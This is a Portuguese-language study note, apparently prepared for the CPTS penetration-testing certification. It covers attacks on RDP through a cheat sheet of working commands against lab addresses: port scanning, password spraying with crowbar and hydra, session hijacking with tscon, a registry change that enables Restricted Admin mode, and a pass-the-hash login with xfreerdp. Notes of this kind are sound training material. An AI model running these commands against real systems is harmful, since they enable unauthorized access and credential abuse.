> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/attacking-common-services/rdp.md).

# RDP

[O Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) é um protocolo proprietário desenvolvido pela Microsoft que fornece ao usuário uma interface gráfica para se conectar a outro computador por meio de uma conexão de rede. Por padrão, o RDP usa a porta `TCP/3389`.

* **Nmap**

```sh
nmap -Pn -p3389 192.168.2.143
```

* **Crowbar - Pulverização de senha RDP**

```sh
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

* **Hydra - Pulverização de senha RDP**

```sh
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

* **Login RDP**

```sh
rdesktop -u admin -p password123 192.168.2.143
```

* Representar um usuário sem sua senha.

```powershell
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

* Execute o sequestro de sessão RDP.

```powershell
net start sessionhijack
```

* Habilite o "Modo de Administração Restrito" no host Windows de destino.

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

* Use a técnica Pass-The-Hash para efetuar login no host de destino sem uma senha.

```
xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA
```
